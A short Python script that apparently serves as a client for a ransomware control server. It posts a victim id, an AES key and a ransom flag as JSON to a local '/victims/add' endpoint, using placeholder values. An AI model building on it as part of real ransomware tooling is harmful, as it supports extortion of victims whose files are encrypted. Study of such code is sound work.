import json
import requests

URL = 'http://localhost:5000/victims/add'
HEADER = {
        "content-type": "application/json"
    }

def post_server(data, url=URL):
    payload = json.dumps(data)
    r = requests.post(url, payload, headers=HEADER)
    return r.json()

if __name__ == "__main__":
    # client = Client()
    post_data = {"id": "mkf",
                 "AES_key": "456",
                 "ransom": "true"
                 }
    post_server(post_data)
    # client.put(post_data)